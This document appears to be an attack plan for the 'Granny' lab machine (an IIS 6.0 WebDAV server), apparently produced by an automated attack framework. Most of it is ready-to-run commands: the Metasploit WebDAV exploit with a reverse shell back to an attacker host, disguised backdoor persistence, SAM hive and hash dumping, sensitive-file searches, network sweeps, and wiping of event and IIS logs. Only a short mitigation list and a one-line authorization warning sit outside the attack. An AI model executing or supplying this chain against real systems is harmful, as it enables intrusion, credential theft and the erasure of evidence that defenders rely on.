# Attack Plan for Target: Granny (10.129.95.234)

## Executive Summary
**Target**: 10.129.95.234 (Granny)  
**OS**: Microsoft Windows Server 2003  
**Primary Service**: IIS 6.0 with WebDAV  
**Critical Vulnerability**: IIS 6.0 WebDAV PROPFIND Request Handling RCE (EXPLODINGCAN)  
**CVSS Score**: 10.0 (Critical)  
**Attack Vector**: Network-based Remote Code Execution  

## Vulnerability Analysis

### Primary Target Vulnerability
- **Plugin ID**: 99523
- **Vulnerability**: Microsoft Windows Server 2003 IIS 6.0 WebDAV PROPFIND Request Handling RCE
- **Codename**: EXPLODINGCAN
- **Severity**: CRITICAL (4/4)
- **CVSS v2 Score**: 10.0/10.0
- **CVSS Vector**: CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C
- **Exploit Available**: ✅ Yes
- **Exploit Ease**: Exploits are available
- **Authentication Required**: None
- **Impact**: Complete system compromise (Confidentiality, Integrity, Availability)

### Available Exploit Frameworks
1. **Metasploit**: Microsoft IIS WebDav ScStoragePathFromUrl Overflow
2. **CANVAS**: Package available
3. **Core Impact**: Available

## Attack Plan Phases

### Phase 1: Reconnaissance & Validation
**Objective**: Confirm target services and vulnerability status

#### 1.1 Port Scanning
```bash
# Basic port scan
nmap -sS -sV -p 80,443,8080 10.129.95.234

# WebDAV specific scan
nmap -sV -p 80,443 --script http-webdav-scan 10.129.95.234

# IIS version detection
nmap -sV -p 80,443 --script http-iis-webdav-vuln 10.129.95.234
```

#### 1.2 Service Enumeration
```bash
# Check WebDAV methods
curl -X OPTIONS http://10.129.95.234/
davtest -url http://10.129.95.234/

# Banner grabbing
nc 10.129.95.234 80
HEAD / HTTP/1.0
```

#### 1.3 Directory Enumeration
```bash
# Use gobuster for directory discovery
gobuster dir -u http://10.129.95.234 -w /path/to/wordlist -x asp,aspx,html
```

### Phase 2: Initial Exploitation
**Objective**: Gain initial foothold via IIS 6.0 WebDAV vulnerability

#### 2.1 Metasploit Exploitation (Primary Method)
```bash
# Launch Metasploit
msfconsole

# Use the IIS WebDAV exploit
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS 10.129.95.234
set RPORT 80
set payload windows/meterpreter/reverse_tcp
set LHOST [ATTACKER_IP]
set LPORT 4444
exploit
```

#### 2.2 Manual Exploitation (Alternative)
```python
# Custom exploit script targeting the buffer overflow
# Target: ScStoragePathFromUrl function in IIS 6.0
# CVE: Related to EXPLODINGCAN NSA exploit
```

#### 2.3 Payload Options
1. **Meterpreter Reverse TCP** (Recommended)
   - Full interactive shell
   - Built-in post-exploitation modules
   - File upload/download capabilities

2. **Standard Reverse Shell**
   - Lightweight option
   - Basic command execution

### Phase 3: Post-Exploitation
**Objective**: Establish persistence and escalate privileges

#### 3.1 Initial Access Validation
```bash
# Verify access level
whoami
whoami /priv
net user
net localgroup administrators
```

#### 3.2 System Information Gathering
```bash
# System information
systeminfo
wmic os get caption,version,architecture
net share

# Network information
ipconfig /all
netstat -an
arp -a
```

#### 3.3 Privilege Escalation
Since this is Windows Server 2003, likely escalation vectors:
- **Local Service to SYSTEM**: Check for vulnerable services
- **Token impersonation**: If SeImpersonatePrivilege available
- **Kernel exploits**: MS08-067, MS09-012, MS10-015

```bash
# Check for kernel exploits
wmic qfe list
wmic qfe get Description,HotFixID,InstalledOn

# Service enumeration
sc query
wmic service list brief
```

#### 3.4 Persistence Mechanisms
```bash
# Registry persistence
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\windows\system32\backdoor.exe"

# Service persistence
sc create "WindowsUpdateService" binpath= "C:\windows\system32\backdoor.exe"

# Scheduled task
schtasks /create /tn "SystemUpdate" /tr "C:\windows\system32\backdoor.exe" /sc onstart
```

### Phase 4: Data Collection & Lateral Movement
**Objective**: Extract sensitive data and expand access

#### 4.1 Credential Harvesting
```bash
# Password hashes
hashdump
use post/windows/gather/credentials/credential_collector

# SAM database
reg save hklm\sam c:\sam
reg save hklm\security c:\security
reg save hklm\system c:\system
```

#### 4.2 File System Analysis
```bash
# Search for sensitive files
dir /s /b C:\ | findstr /i "password\|pass\|pwd\|config\|backup"
dir /s /b C:\ | findstr /i "\.txt$\|\.doc$\|\.xls$\|\.pdf$"

# Database files
dir /s /b C:\ | findstr /i "\.mdb$\|\.sql$\|\.db$"
```

#### 4.3 Network Discovery
```bash
# Network mapping
for /L %i in (1,1,254) do @ping -n 1 -w 200 10.129.95.%i | find "TTL"

# Share enumeration
net view /domain
net view \\[target_ip]
```

### Phase 5: Covering Tracks
**Objective**: Remove evidence of compromise

#### 5.1 Log Cleanup
```bash
# Clear Windows event logs
wevtutil cl Application
wevtutil cl Security
wevtutil cl System

# IIS log cleanup
del C:\WINDOWS\system32\LogFiles\W3SVC*\*.log
```

#### 5.2 File Cleanup
```bash
# Remove uploaded files
del C:\windows\temp\*
del %temp%\*

# Clear recent file lists
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f
```

## Risk Assessment & Mitigation

### Immediate Risks
1. **Complete System Compromise**: CVSS 10.0 vulnerability allows full control
2. **Data Breach**: Access to all files and databases
3. **Lateral Movement**: Potential compromise of entire network
4. **Service Disruption**: Ability to crash or modify services

### Recommended Mitigations
1. **Immediate**: Disable WebDAV if not required
2. **Patch Management**: Apply Microsoft security updates
3. **Upgrade**: Migrate from Windows Server 2003 (End of Life)
4. **Network Segmentation**: Isolate legacy systems
5. **Monitoring**: Implement intrusion detection systems

## Timeline Estimation
- **Phase 1 (Recon)**: 30-60 minutes
- **Phase 2 (Exploitation)**: 15-30 minutes
- **Phase 3 (Post-Exploitation)**: 1-2 hours
- **Phase 4 (Data Collection)**: 2-4 hours
- **Phase 5 (Cleanup)**: 30 minutes

**Total Estimated Time**: 4-7 hours

## Success Criteria
- [ ] Successful exploitation of IIS 6.0 WebDAV vulnerability
- [ ] Administrative/SYSTEM level access achieved
- [ ] Persistence mechanisms established
- [ ] Credential harvesting completed
- [ ] Sensitive data identified and extracted
- [ ] Network mapping completed
- [ ] Evidence cleanup performed

## Tools Required
- Metasploit Framework
- Nmap
- Gobuster/Dirb
- Custom exploit scripts
- Post-exploitation frameworks (Sliver, Empire)
- Credential harvesting tools

## Legal & Ethical Considerations
⚠️ **WARNING**: This attack plan is for authorized penetration testing only. Ensure proper authorization and scope before execution.

---
**Created**: $(date)  
**Target**: Granny (10.129.95.234)  
**Analyst**: Attack Executor Framework 